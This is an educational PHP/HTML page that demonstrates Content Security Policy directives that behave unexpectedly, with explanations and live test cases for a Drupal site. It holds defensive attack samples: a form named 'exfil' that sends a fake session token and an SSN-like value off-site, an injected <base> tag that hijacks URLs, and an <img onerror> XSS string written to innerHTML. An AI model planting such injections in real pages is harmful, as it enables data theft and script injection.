<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Advanced CSP Demo</title>
  <meta name="description" content="Demonstrations of the CSP directives that behave unexpectedly.">
  <meta name="author" content="John Brandenburg">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<?php if ($inject_base) { ?>
  <!--
    Injected <base> tag. This is what an attacker gets from a single injected
    element: every relative URL on the page now resolves against their host.
    base-uri is the only directive that stops it, and it does not inherit from
    default-src.
  -->
  <base href="https://picsum.photos/">
<?php } ?>
  <script <?php echo $nonce_attribute; ?>>
    // Registered first thing so violations raised while the document is still
    // parsing are captured. The page-bottom script drains this buffer.
    window.__cspBuf = [];
    document.addEventListener('securitypolicyviolation', function (e) {
      window.__cspBuf.push(e);
    });
  </script>
  <link rel="stylesheet" href="/demo/css/normalize.css">
  <link rel="stylesheet" href="/demo/css/skeleton.css">
  <link rel="stylesheet" href="/demo/css/custom.css">
  <style <?php echo $nonce_attribute; ?>>
    .status { display:inline-block; padding:2px 10px; border-radius:3px;
              font-size:12px; font-weight:600; letter-spacing:.5px; text-transform:uppercase; }
    .status-wait    { background:#eee; color:#666; }
    .status-ran     { background:#c0392b; color:#fff; }
    .status-blocked { background:#27ae60; color:#fff; }
    .status-info    { background:#2980b9; color:#fff; }
    .vlog { background:#111; color:#eee; font-family:monospace; font-size:12px;
            padding:10px; max-height:170px; overflow:auto; border-radius:3px; }
    .vlog div { padding:1px 0; }
    .vlog .empty { color:#7f8c8d; }
    .case { border-left:4px solid #ddd; padding-left:14px; margin-bottom:8px; }
    .case.active { border-left-color:#c0392b; }
    .policy-links { display:flex; flex-wrap:wrap; gap:.8rem 2.4rem;
                    list-style:none; padding-left:0; margin-bottom:2.5rem; }
    .policy-links .navbar-item { float:none; margin:0; }
    .policy-links .navbar-link { display:block; padding:.4rem 0; margin-right:0;
                                 line-height:1.4; }
    .policy { word-break:break-all; }
    .muted { color:#777; font-size:.9em; }
  </style>
</head>
<body>

<div class="container">
  <nav class="navbar">
    <ul class="navbar-list">
      <li class="navbar-item"><a class="navbar-link" href="/demo/advanced.php?csp=none">No CSP</a></li>
      <li class="navbar-item"><a class="navbar-link" href="/demo/index.php">&larr; Basic demo</a></li>
      <li class="navbar-item"><a class="navbar-link" href="/">Back to Drupal</a></li>
    </ul>
  </nav>

  <h1>Advanced CSP Demo</h1>
  <p>The <a href="/demo/index.php">basic demo</a> covers which hosts may serve
    scripts, styles, images and frames. This page covers the directives that
    don't behave the way that mental model predicts.</p>

  <h5>Directives that do <em>not</em> inherit from <code>default-src</code></h5>
  <p class="muted">Each pair below is the same policy with and without the directive under test.</p>
  <ul class="navbar-list policy-links">
    <li class="navbar-item"><a class="navbar-link" href="?csp=form-action-absent">form-action: absent</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=form-action">form-action: set</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=base-uri-absent">base-uri: absent</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=base-uri">base-uri: none</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=frame-ancestors-absent">frame-ancestors: absent</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=frame-ancestors">frame-ancestors: none</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=sandbox">sandbox</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=upgrade-insecure">upgrade-insecure-requests</a></li>
  </ul>

  <h5>Directives that cover more than you think</h5>
  <ul class="navbar-list policy-links">
    <li class="navbar-item"><a class="navbar-link" href="?csp=object-src-absent">object-src: absent</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=object-src">object-src: none</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=connect-src">connect-src vs strict-dynamic</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=worker-via-child-src">worker via child-src</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=worker-src">worker-src: none</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=script-attr">script-src-attr vs -elem</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=trusted-types">Trusted Types</a></li>
    <li class="navbar-item"><a class="navbar-link" href="?csp=double-header">two CSP headers</a></li>
  </ul>

  <hr />

  <h3>Response headers being sent</h3>
<?php if ($csp) { ?>
  <p><code class="code-block policy"><?php echo htmlspecialchars($csp); ?></code></p>
<?php   if ($extra_csp) { ?>
  <p><code class="code-block policy"><?php echo htmlspecialchars($extra_csp); ?></code></p>
  <p class="muted">Two <code>Content-Security-Policy</code> headers. Both are
    enforced independently, so a resource must satisfy <strong>both</strong>.</p>
<?php   } ?>
<?php } else { ?>
  <p>No Content Security Policy.</p>
<?php } ?>

  <h5>Violations reported by this page</h5>
  <div class="vlog" id="vlog"><div class="empty">none yet</div></div>

  <hr />

  <!-- ============================ form-action ============================ -->
  <div class="case <?php echo strpos($csp_option, 'form-action') === 0 ? 'active' : ''; ?>">
    <h2>form-action <span class="status status-wait" id="s-form">submit to test</span></h2>
    <p><strong>What happens:</strong> The form sends its fields to
      <code>example.com</code>. With
      <a href="?csp=form-action-absent"><code>form-action</code> absent</a>, a
      new tab opens and the submitted values appear in its URL. With
      <a href="?csp=form-action"><code>form-action 'self'</code></a>, the browser
      cancels that navigation and records a violation.</p>
    <p><strong>Why:</strong> Form submission is a navigation, not a resource
      fetch. <code>default-src</code> therefore does not restrict it; an explicit
      <code>form-action</code> directive does.</p>
    <form id="exfil" method="GET" action="https://example.com/collect" target="_blank">
      <input type="hidden" name="session" value="pretend-this-is-a-token">
      <label>Data an attacker would like to have
        <input type="text" name="data" value="123-45-6789">
      </label>
      <button class="button-primary" type="submit">Submit off-site</button>
    </form>
    <p class="muted">Opens in a new tab so you don't lose your place. Check the
      address bar of that tab &mdash; the values went with it.</p>
  </div>

  <hr />

  <!-- ============================== base-uri ============================= -->
  <div class="case <?php echo strpos($csp_option, 'base-uri') === 0 ? 'active' : ''; ?>">
    <h2>base-uri <span class="status status-wait" id="s-base">&hellip;</span></h2>
    <p><strong>What happens:</strong> Both cases inject
      <code>&lt;base href="https://picsum.photos/"&gt;</code>. With
      <a href="?csp=base-uri-absent"><code>base-uri</code> absent</a>, the browser
      accepts it and resolves every relative URL against that origin. With
      <a href="?csp=base-uri"><code>base-uri 'none'</code></a>, the browser
      ignores the element and records a violation.</p>
    <p><strong>Why:</strong> <code>default-src</code> can restrict the requests
      produced after URLs are resolved, but it does not control which document
      base is accepted. That is the separate job of <code>base-uri</code>.</p>
    <p><strong>Watch it:</strong> The image below is written as
      <code>&lt;img src="images/moustache-cakes.jpeg"&gt;</code>. Its
      <em>resolved</em> URL is:</p>
    <p><code class="code-block policy" id="base-resolved">&hellip;</code></p>
    <img id="relimg" src="images/moustache-cakes.jpeg" width="208" height="156" alt="relative-path image">
    <p class="muted">On the hijacked page, scroll down: the worker and
      <code>&lt;object&gt;</code> sections have broken too. Even root-relative
      URLs like <code>/demo/assets/worker.js</code> resolve against the injected
      base's <em>origin</em>, so the one element reroutes assets across the page.</p>
  </div>

  <hr />

  <!-- =========================== frame-ancestors ========================= -->
  <div class="case <?php echo strpos($csp_option, 'frame-ancestors') === 0 ? 'active' : ''; ?>">
    <h2>frame-ancestors <span class="status status-info" id="s-fa">open the framing test</span></h2>
    <p><strong>What happens:</strong> The framing test acts as an attacker's page.
      It can embed the version with
      <code>frame-ancestors</code> absent, but
      <code>frame-ancestors 'none'</code> makes the browser refuse the iframe.</p>
    <p><strong>Why:</strong> <code>frame-ancestors</code> is enforced by the page
      being framed and controls who may embed it. <code>default-src</code>
      controls what that page may load, so it provides no clickjacking
      protection. This directive must be sent in a response header; browsers
      ignore it in a <code>&lt;meta&gt;</code> policy.</p>
    <p><a class="button" href="/demo/frame-test.php?csp=frame-ancestors-absent" target="_blank">Framing test: absent</a>
       <a class="button" href="/demo/frame-test.php?csp=frame-ancestors" target="_blank">Framing test: 'none'</a></p>
  </div>

  <hr />

  <!-- ============================= connect-src =========================== -->
  <div class="case <?php echo $csp_option === 'connect-src' ? 'active' : ''; ?>">
    <h2>connect-src <span class="status status-wait" id="s-connect">click to test</span></h2>
    <p><strong>What happens:</strong> The
      <a href="?csp=connect-src">active policy</a> allows this page's nonced
      script to run, but clicking the button still blocks its request to
      <code>ad.doubleclick.net</code>.</p>
    <p><strong>Why:</strong> <code>'strict-dynamic'</code> propagates trust only
      when an allowed script loads another script. A beacon, <code>fetch()</code>,
      XHR, EventSource or WebSocket is a connection governed separately by
      <code>connect-src</code>, which this case limits to <code>'self'</code>.</p>
    <p><button class="button-primary" id="beacon">Send beacon to ad.doubleclick.net</button></p>
    <p class="muted">The violation fires before the network request, so this
      works with no internet connection.</p>
  </div>

  <hr />

  <!-- ======================== worker-src / child-src ===================== -->
  <div class="case <?php echo strpos($csp_option, 'worker') === 0 ? 'active' : ''; ?>">
    <h2>worker-src <span class="status status-wait" id="s-worker">&hellip;</span></h2>
    <p><strong>What happens:</strong> This page always tries to start a
      same-origin worker from the same URL. Under
      <a href="?csp=worker-via-child-src"><code>child-src 'self'</code></a> it
      runs because <code>worker-src</code> is absent. Under
      <a href="?csp=worker-src"><code>worker-src 'none'</code></a> the otherwise
      identical worker is blocked.</p>
    <p><strong>Why:</strong> The browser uses the first directive present in the
      worker fallback chain:<br>
      <code>worker-src &rarr; child-src &rarr; script-src &rarr; default-src</code>.
      A specific <code>worker-src</code> therefore replaces, rather than combines
      with, the broader fallbacks.</p>
    <p class="muted">Note: a worker cannot be loaded cross-origin in the first
      place &mdash; that's same-origin policy, not CSP. This is about whether
      workers run at all, not about which host they come from.</p>
    <p class="muted">This section also reports blocked under
      <a href="?csp=trusted-types">Trusted Types</a> and
      <a href="?csp=sandbox">sandbox</a>, for unrelated reasons:
      <code>new Worker(string)</code> is itself a Trusted Types sink, and a
      sandboxed opaque origin can't load a same-origin script.</p>
  </div>

  <hr />

  <!-- ==================== script-src-attr vs script-src-elem ============= -->
  <div class="case <?php echo $csp_option === 'script-attr' ? 'active' : ''; ?>">
    <h2>script-src-attr vs -elem <span class="status status-wait" id="s-attr">click the button</span></h2>
    <p><strong>What happens:</strong> Under
      <a href="?csp=script-attr">this policy</a>, the page's
      <code>&lt;script&gt;</code> blocks run, but the button's inline
      <code>onclick=</code> does not. Clicking still updates the status badge
      because an allowed script also installed a separate
      <code>addEventListener()</code> handler.</p>
    <p><strong>Why:</strong> <code>script-src-elem</code> governs script elements,
      while <code>script-src-attr</code> governs inline event attributes. This
      policy allows the former and sets the latter to <code>'none'</code>.</p>
    <p><button class="button" id="attrbtn" onclick="window.__attrFired = true; document.getElementById('attr-out').textContent = 'The onclick handler ran.';">Inline onclick= handler</button></p>
    <p><span id="attr-out" class="muted">(handler has not run)</span></p>
  </div>

  <hr />

  <!-- ============================== object-src =========================== -->
  <div class="case <?php echo strpos($csp_option, 'object-src') === 0 ? 'active' : ''; ?>">
    <h2>object-src <span class="status status-wait" id="s-object">&hellip;</span></h2>
    <p><strong>What happens:</strong> Both boxes load same-origin documents that
      contain script. Under
      <a href="?csp=object-src-absent"><code>object-src</code> absent</a>,
      <code>default-src 'self'</code> permits both documents and their scripts
      run. Under <a href="?csp=object-src"><code>object-src 'none'</code></a>,
      neither document loads.</p>
    <p><strong>Why:</strong> The parent page's <code>script-src</code> does not
      govern a document loaded through <code>&lt;object&gt;</code> or
      <code>&lt;embed&gt;</code>; the load is selected by <code>object-src</code>.
      This matters when users can place active HTML or SVG files on your origin,
      such as through an upload or attachment.</p>
    <div class="row">
      <div class="one-half column">
        <p class="muted">&lt;object type="text/html"&gt;</p>
        <object type="text/html" data="/demo/assets/payload.html" width="260" height="80"></object>
      </div>
      <div class="one-half column">
        <p class="muted">&lt;embed type="image/svg+xml"&gt; &mdash; an
          <code>&lt;img&gt;</code> would <em>not</em> run this script.</p>
        <embed type="image/svg+xml" src="/demo/assets/payload.svg" width="120" height="120">
      </div>
    </div>
  </div>

  <hr />

  <!-- =========================== two CSP headers ========================= -->
  <div class="case <?php echo $csp_option === 'double-header' ? 'active' : ''; ?>">
    <h2>Two CSP headers <span class="status status-wait" id="s-double">&hellip;</span></h2>
    <p><strong>What happens:</strong> Under
      <a href="?csp=double-header">this case</a>, the first CSP header allows
      <code>picsum.photos</code>; the second does not. The external image is
      therefore blocked.</p>
    <p><strong>Why:</strong> Browsers enforce every CSP header as a separate
      policy. A request must satisfy all of them, so their combined effect is an
      intersection. Adding a source to Drupal's policy cannot relax another
      policy still being sent by a CDN or web server.</p>
    <img id="extimg" src="https://picsum.photos/208/156" width="208" height="156" alt="external image">
  </div>

  <hr />

  <!-- ===================== upgrade-insecure-requests ====================== -->
  <div class="case <?php echo $csp_option === 'upgrade-insecure' ? 'active' : ''; ?>">
    <h2>upgrade-insecure-requests <span class="status status-wait" id="s-upgrade">&hellip;</span></h2>
    <p><strong>What happens:</strong> The image markup contains an
      <code>http://</code> URL. On an HTTPS page,
      <a href="?csp=upgrade-insecure"><code>upgrade-insecure-requests</code></a>
      rewrites that request to <code>https://</code> before it leaves the
      browser.</p>
    <p><strong>Why:</strong> This document directive upgrades insecure
      subresource URLs; it does not use <code>default-src</code> as a fallback.
      Modern browsers already auto-upgrade some mixed-content types, including
      images, so <a href="?csp=none">the no-CSP comparison</a> may look the same.
      The Network panel shows the URL actually requested.</p>
    <p><code class="code-block policy" id="upgrade-resolved">&hellip;</code></p>
    <img id="httpimg" src="http://picsum.photos/208/156" width="208" height="156" alt="http image">
  </div>

  <hr />

  <!-- =============================== sandbox ============================= -->
  <div class="case <?php echo $csp_option === 'sandbox' ? 'active' : ''; ?>">
    <h2>sandbox <span class="status status-wait" id="s-sandbox">&hellip;</span></h2>
    <p><strong>What happens:</strong>
      <a href="?csp=sandbox">This case</a> sends
      <code>sandbox allow-scripts</code>. JavaScript still runs, but the document
      receives an opaque origin, loses same-origin storage access, and cannot
      submit forms or open popups.</p>
    <p><strong>Why:</strong> CSP's <code>sandbox</code> applies the restrictions
      of an <code>&lt;iframe sandbox&gt;</code> to the whole document. It starts with
      every sandbox restriction enabled; <code>allow-scripts</code> removes only
      the script restriction. There is no <code>allow-same-origin</code>,
      <code>allow-forms</code> or <code>allow-popups</code> token here.</p>
    <p>Document origin: <code id="sandbox-origin">&hellip;</code></p>
    <p class="muted">While this case is active, scroll back up and press the
      <strong>form-action</strong> submit button. Nothing happens at all &mdash;
      no navigation, no new tab, and the status badge never even changes,
      because the submission is blocked before the <code>submit</code> event
      fires. Silent failure is the thing to recognise here.</p>
  </div>

  <hr />

  <!-- ============================ Trusted Types ========================== -->
  <div class="case <?php echo $csp_option === 'trusted-types' ? 'active' : ''; ?>">
    <h2>Trusted Types <span class="status status-wait" id="s-tt">click to test</span></h2>
    <p><strong>What happens:</strong> The button assigns a string containing an
      <code>&lt;img onerror&gt;</code> payload to <code>innerHTML</code>. With
      <a href="?csp=trusted-types"><code>require-trusted-types-for 'script'</code></a>,
      the assignment throws a <code>TypeError</code>; the browser creates no
      element and the payload cannot run.</p>
    <p><strong>Why:</strong> Trusted Types does not allow-list network sources.
      It protects DOM-XSS injection sinks by requiring a typed value such as
      <code>TrustedHTML</code> instead of a plain string, giving the application
      an explicit policy where that value can be sanitized.</p>
    <p><button class="button-primary" id="ttbtn">Write &lt;img onerror&gt; to innerHTML</button></p>
    <p><span id="tt-out" class="muted">(not yet attempted)</span></p>
    <div id="tt-sink" style="border:1px dashed #ccc;padding:6px;min-height:28px"></div>
  </div>

  <hr />
  <p class="muted">Every case changes one directive against the same permissive
    baseline, so the directive under test is the only variable.</p>
  <br />
</div>

<script <?php echo $nonce_attribute; ?>>
(function () {
  'use strict';

  // Trusted Types is one of the cases, so nothing here may use innerHTML.
  function set(id, state, text) {
    var el = document.getElementById(id);
    if (!el) { return; }
    el.className = 'status status-' + state;
    el.textContent = text;
  }
  function text(id, s) {
    var el = document.getElementById(id);
    if (el) { el.textContent = s; }
  }

  // --- violation log ---------------------------------------------------
  var log = document.getElementById('vlog');
  var seen = 0;
  function record(e) {
    if (seen === 0) { log.textContent = ''; }
    seen++;
    var row = document.createElement('div');
    row.textContent = e.effectiveDirective + '  ←  ' +
      (e.blockedURI || '(inline)') +
      (e.disposition === 'report' ? '   [report-only]' : '');
    log.appendChild(row);
    log.scrollTop = log.scrollHeight;
  }
  // Drain anything raised during parsing, then keep listening.
  (window.__cspBuf || []).forEach(record);
  document.addEventListener('securitypolicyviolation', record);

  // --- base-uri --------------------------------------------------------
  var relimg = document.getElementById('relimg');
  if (relimg) {
    var resolved = relimg.src;
    text('base-resolved', resolved);
    var hijacked = resolved.indexOf(location.origin) !== 0;
    set('s-base', hijacked ? 'ran' : 'blocked',
        hijacked ? 'URL hijacked' : 'resolves to this origin');
  }

  // --- upgrade-insecure-requests ---------------------------------------
  // The DOM src property reflects the attribute, not the request the browser
  // actually made, so whether the image loaded is the only reliable signal.
  // On an https page an un-upgraded http:// subresource is mixed content and
  // is blocked by the browser regardless of CSP.
  var httpimg = document.getElementById('httpimg');
  if (httpimg) {
    setTimeout(function () {
      var loaded = httpimg.naturalWidth > 0;
      text('upgrade-resolved', 'markup says ' + httpimg.getAttribute('src') +
        '  —  ' + (loaded
          ? 'loaded (the request went out over https)'
          : 'did not load (this policy does not allow the image host at all)'));
      set('s-upgrade', loaded ? 'info' : 'blocked',
          loaded ? 'request upgraded to https' : 'blocked by img-src');
    }, 2000);
  }

  // --- sandbox ---------------------------------------------------------
  var documentOrigin = String(window.origin);
  var sandboxed = documentOrigin === 'null';
  text('sandbox-origin', documentOrigin);
  set('s-sandbox', sandboxed ? 'ran' : 'wait',
      sandboxed ? 'opaque origin' : 'normal origin');

  // --- object-src ------------------------------------------------------
  var objRan = {}, objTimer;
  window.addEventListener('message', function (e) {
    if (e.data === 'object-html-script-ran') { objRan.html = true; }
    if (e.data === 'object-svg-script-ran') { objRan.svg = true; }
  });
  objTimer = setTimeout(function () {
    var n = (objRan.html ? 1 : 0) + (objRan.svg ? 1 : 0);
    set('s-object', n ? 'ran' : 'blocked',
        n ? n + ' of 2 payload scripts ran' : 'both blocked');
  }, 1800);

  // --- worker-src ------------------------------------------------------
  try {
    var w = new Worker('/demo/assets/worker.js');
    var wTimer = setTimeout(function () { set('s-worker', 'blocked', 'worker never started'); }, 1500);
    w.onmessage = function () { clearTimeout(wTimer); set('s-worker', 'ran', 'worker running'); };
    w.onerror = function () { clearTimeout(wTimer); set('s-worker', 'blocked', 'worker blocked'); };
  }
  catch (err) {
    set('s-worker', 'blocked', 'blocked: ' + err.name);
  }

  // --- two CSP headers -------------------------------------------------
  var ext = document.getElementById('extimg');
  if (ext) {
    setTimeout(function () {
      var ok = ext.naturalWidth > 0;
      set('s-double', ok ? 'ran' : 'blocked', ok ? 'external image loaded' : 'external image blocked');
    }, 1800);
  }

  // --- connect-src -----------------------------------------------------
  var beacon = document.getElementById('beacon');
  if (beacon) {
    beacon.addEventListener('click', function () {
      set('s-connect', 'wait', 'sending…');
      fetch('https://ad.doubleclick.net/ccm/s/collect?demo=1', { mode: 'no-cors' })
        .then(function () { set('s-connect', 'ran', 'beacon sent — not blocked'); })
        .catch(function (err) { set('s-connect', 'blocked', 'blocked by connect-src'); });
    });
  }

  // --- script-src-attr -------------------------------------------------
  var attrbtn = document.getElementById('attrbtn');
  if (attrbtn) {
    attrbtn.addEventListener('click', function () {
      setTimeout(function () {
        var fired = window.__attrFired === true;
        set('s-attr', fired ? 'ran' : 'blocked',
            fired ? 'onclick= ran' : 'onclick= blocked, this listener still works');
      }, 120);
    });
  }

  // --- Trusted Types ---------------------------------------------------
  var ttbtn = document.getElementById('ttbtn');
  if (ttbtn) {
    ttbtn.addEventListener('click', function () {
      var sink = document.getElementById('tt-sink');
      try {
        sink.innerHTML = '<img src="x" onerror="document.getElementById(\'tt-out\').textContent = \'XSS payload executed.\'">';
        text('tt-out', 'innerHTML assignment was allowed.');
        set('s-tt', 'ran', 'innerHTML allowed');
      }
      catch (err) {
        text('tt-out', err.name + ': ' + err.message);
        set('s-tt', 'blocked', 'innerHTML refused');
      }
    });
  }

  // --- form-action -----------------------------------------------------
  var form = document.getElementById('exfil');
  if (form) {
    form.addEventListener('submit', function () {
      set('s-form', 'wait', 'submitting…');
      setTimeout(function () {
        // A blocked submission raises a violation; the log above will show it.
        set('s-form', seen > 0 ? 'blocked' : 'ran',
            seen > 0 ? 'submission blocked' : 'submitted off-site');
      }, 900);
    });
  }
}());
</script>
</body>
</html>
